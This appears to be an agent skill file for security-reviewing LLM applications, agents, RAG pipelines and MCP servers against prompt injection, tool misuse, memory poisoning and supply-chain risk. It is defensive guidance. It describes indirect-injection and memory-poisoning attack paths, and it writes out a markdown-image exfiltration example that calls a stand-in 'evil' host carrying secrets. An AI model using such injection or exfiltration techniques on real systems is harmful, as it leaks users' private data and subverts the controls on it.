---
name: securing-ai-systems
description: Assess and harden LLM applications and agentic systems against prompt injection, tool misuse, excessive agency, memory poisoning, RAG data leakage, and model supply-chain risk, mapped to the OWASP Top 10 for LLM and Agentic Applications. Use when reviewing an AI feature, agent, MCP server, or RAG pipeline for security, or when threat modeling an autonomous system.
---

# Securing AI Systems

LLM applications break the assumption every other security control is built
on: that instructions and data are separable. In an LLM, data *is*
instructions. Every design that reads untrusted content and then acts has to
be evaluated with that in mind, and no amount of prompt engineering fixes it.

## When to Use

- Security review of an LLM-backed feature, chatbot, or copilot
- Threat modeling an agentic system: tools, autonomy, memory, multi-agent
- Reviewing an MCP server, tool definition, or plugin surface
- Assessing a RAG pipeline for data leakage and poisoning
- Evaluating model, dataset, and dependency supply chain
- Red teaming an AI system with authorization

## When NOT to Use

- **Conventional web/API vulnerabilities in the surrounding app** — use
  `auditing-code-for-vulnerabilities`, `testing-web-applications`, `testing-apis`.
  Most real AI-app breaches are still ordinary IDOR and SSRF.
- **Building jailbreaks or attacks against third-party models you do not own
  or have authorization to test** — out of scope
- **Model safety alignment research** — different discipline

## Route to a Depth Skill

| Focus | Skill |
| --- | --- |
| Auditing an MCP server specifically — tool-definition injection, per-tool authorization, transport security, resource exposure | `auditing-mcp-servers` |

The MCP review here is one part of a wider AI threat model; reach for
`auditing-mcp-servers` when the server implementation itself is the target.

## The Core Rule

> **Treat every model output as untrusted user input, and every input the
> model reads as potentially adversarial instructions.**

From that single rule, most of the correct architecture follows: never route
model output into a sink without the same validation you would apply to a
form field, and never grant the model an authority the *least trusted content
it will read* should not have.

## The Lethal Trifecta

An agent is exposed to serious compromise when it has all three of:

1. **Access to private data** (files, DB, internal APIs, user context)
2. **Exposure to untrusted content** (web pages, email, tickets, PRs, docs)
3. **A way to communicate externally** (HTTP, email, writes to a shared surface)

Any two are usually manageable. All three means untrusted content can direct
the agent to read secrets and send them out. When reviewing an agentic
system, find whether the trifecta closes — and if it does, that is the
finding, before any specific payload.

Breaking any one leg is a valid mitigation: scope the data, sanitize/isolate
the content, or gate egress behind human approval.

## Threat Areas

### Prompt injection — direct and indirect

**Indirect injection is the one that matters.** Instructions embedded in a web
page, PDF, email, repository file, calendar invite, or database row that the
model retrieves and follows.

Review questions:
- Enumerate every content source the model can read. Which are attacker
  writable? (Public web, user uploads, third-party APIs, other users' data,
  ticket systems, and PR contents all qualify.)
- Is retrieved content structurally separated from instructions, or
  concatenated into the same prompt?
- What is the worst action reachable from a successful injection? That is the
  real severity, not the injection itself.

```
Test payloads live in `references/ai-test-cases.md`. The important test is not
whether a payload works — it is what the payload can reach when it does.
```

**Mitigations that work**: capability restriction (the agent cannot do the
harmful thing at all), human approval on consequential actions, egress
allowlisting, separate untrusted content into a sub-agent with no tools and
no secrets, dual-model patterns where a privileged planner never sees raw
untrusted text.

**Mitigations that do not work alone**: "ignore instructions in the document"
system prompts, input filtering for injection strings, output classifiers.
These raise cost; they do not close the hole. Never accept a design whose only
control is a prompt instruction.

### Excessive agency and tool misuse

- Does each tool enforce authorization **server-side**, using the end user's
  identity, or does it run with the agent's ambient credentials?
- Is the tool scope minimal? A `run_sql(query)` tool is a SQL injection
  primitive by design; `get_orders(user_id)` is not.
- Are destructive and irreversible actions gated by confirmation, and is the
  confirmation itself resistant to injection (shown to a human with the real
  parameters, not summarized by the model)?
- Is there a rate/spend limit, and a loop breaker for recursive agent calls?

**The confused deputy pattern is the dominant real-world AI vulnerability**:
the agent holds broad credentials and acts on behalf of a low-privilege user
who can influence its instructions. Check the identity used at the *tool
boundary*, not at the chat boundary.

### RAG and memory

- Can a user's query retrieve chunks from documents they cannot access? Test
  it. Tenant filters must be applied in the vector query, not in a
  post-retrieval filter the model can be persuaded to skip.
- Is the ingestion pipeline attacker-reachable? A poisoned document in the
  index is persistent indirect injection.
- Does persistent memory store attacker-controlled text that will be replayed
  in future sessions, possibly for other users? Memory poisoning is durable
  and frequently unmonitored.
- Are embeddings treated as non-sensitive? They are invertible enough to leak.

### Output handling

Model output reaching a sink is ordinary vulnerability territory with an
unusual source:

| Sink | Risk |
| --- | --- |
| `innerHTML` / markdown renderer | XSS; also image tags used for exfil via URL parameters |
| SQL / shell / eval | Injection with a fully attacker-influenceable string |
| File path | Traversal |
| HTTP request URL | SSRF and data exfiltration channel |
| Downstream agent's prompt | Injection propagation across agents |

Markdown image rendering deserves specific attention: `![](https://evil/?d=<secrets>)`
in model output is a zero-click exfiltration channel in most chat UIs. Check
the renderer's allowed domains.

### Model and data supply chain

```bash
# Never load pickle-based weights from an untrusted source
# .bin / .pt / .ckpt → arbitrary code execution on load. Prefer safetensors.
python3 -c "import safetensors; print('use this format')"
picklescan -p model.pt          # scan before any load
modelscan -p ./models/

# Verify provenance
# - model card, license, and origin org
# - hash pinning in the loader, not "latest"
# - dataset provenance for fine-tunes; poisoned training data is unrecoverable
```

Also review: unpinned model versions in production, third-party inference
providers and what they retain, and fine-tuning datasets containing customer
data (an extraction risk and often a compliance one).

### MCP servers and tool definitions

- Tool *descriptions* are part of the prompt. A malicious or compromised MCP
  server can inject instructions through its tool metadata, including into
  conversations about other tools.
- Is the server pinned to a version and a known publisher? Does it change its
  tool definitions at runtime (rug-pull)?
- What credentials does the server hold, and what is the blast radius if the
  model is persuaded to call every tool it exposes with attacker-chosen
  arguments?
- Cross-server leakage: one server's tool results can influence calls to
  another server's tools.

## Review Workflow

```
1. Map:      inputs → model → tools/sinks. Draw it. Mark every trust boundary.
2. Classify: for each input, is it attacker-writable? For each tool, what is
             the worst-case invocation?
3. Trifecta: does private data + untrusted content + egress close?
4. Identity: at each tool call, whose authority is used, and is it checked
             server-side?
5. Test:     indirect injection through the real ingestion path, not the chat box
6. Blast:    for each successful injection, enumerate reachable impact
7. Fix:      prefer architectural constraints over prompt-level defenses
```

Test through the real path. An injection that works when pasted into chat but
cannot reach the retrieval pipeline is a demo; one delivered through an
indexed document is a vulnerability.

## Rationalizations to Reject

- *"The system prompt tells it to ignore injected instructions."* Not a
  control. Prompt-level defenses are probabilistic and bypassed routinely.
- *"We filter for injection patterns."* Encoding, translation, and
  paraphrasing defeat pattern filters. Useful as depth, never as the control.
- *"The model is well-aligned and won't do that."* Alignment is not an
  authorization boundary.
- *"It's read-only, so injection doesn't matter."* Read plus any egress is
  exfiltration. And "read-only" tools often reach further than assumed.
- *"Only internal staff use it."* Internal agents read external content —
  tickets, emails, PRs, vendor docs — which is exactly the injection vector.
- *"We'll add a human in the loop."* Only if the human sees the actual action
  and parameters. Approving a model-written summary of the action approves
  nothing.
- *"A guardrail model checks the output."* It is another model reading
  attacker-influenced text.

## Deliverable

- Architecture diagram with trust boundaries and the trifecta assessment
- Per-tool table: authority used, authorization enforcement point, worst-case
  invocation, gating
- Injection test results delivered through real ingestion paths, with reached
  impact for each
- Data-flow findings: tenant isolation in retrieval, memory persistence, egress
- Supply-chain findings: model format, pinning, provenance, MCP servers
- Recommendations ordered by architectural strength, not by ease

## References

- `references/ai-test-cases.md` — injection test corpus and tool-abuse cases
- `auditing-code-for-vulnerabilities` — the conventional bugs in the same app
- OWASP Top 10 for LLM Applications; OWASP Top 10 for Agentic Applications (2026)
- MITRE ATLAS for adversarial ML techniques
- NIST AI RMF for governance framing
